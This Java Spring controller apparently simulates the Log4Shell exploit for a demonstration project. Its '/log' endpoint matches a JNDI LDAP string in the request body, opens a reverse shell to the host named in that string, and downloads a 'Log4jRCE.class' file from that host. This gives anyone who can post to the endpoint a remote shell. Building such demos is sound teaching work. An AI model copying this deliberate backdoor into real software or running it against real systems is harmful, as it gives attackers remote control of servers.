package com.fyp.logger.controller;

import com.fyp.logger.util.ReverseShell;
import org.apache.logging.log4j.LogManager;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@RestController
public class LoggerController {

    @PostMapping("/log")
    public void log(@RequestBody String content) throws Exception {
        Pattern pattern = Pattern.compile("\\$\\{jndi:ldap://(.+):(\\d+)/(.+)}");
        Matcher matcher = pattern.matcher(content);

        if (matcher.matches()) {
            String host = matcher.group(1);
            int port = Integer.parseInt(matcher.group(2));

            new Thread(() -> {
                try {
                    ReverseShell.create(host, 9001);
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }).start();

            LogManager.getLogger().info(content);
            makeHttpRequest(new URL("http://" + host + ":8888/Log4jRCE.class"));
            LogManager.getLogger().info("Object Class deserializing ...........");
            LogManager.getLogger().info("Object class executing reverse shell ...........");
        } else {
            LogManager.getLogger().info(content);
        }
    }

    private static void makeHttpRequest(URL turl) throws IOException {
        HttpURLConnection con=null;
        try {
            con = (HttpURLConnection) turl.openConnection();

            con.setRequestMethod("GET");
            con.setRequestProperty("Content-Type", "application/octet-stream");

            int responseCode = con.getResponseCode();
            InputStream inputStream = con.getInputStream();
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int length;
            while ((length = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, length);
            }
            byte[] data = outputStream.toByteArray();
            inputStream.close();
            outputStream.close();
        }
        finally {
            if (con != null) {
                con.disconnect();
            }
        }
    }
}
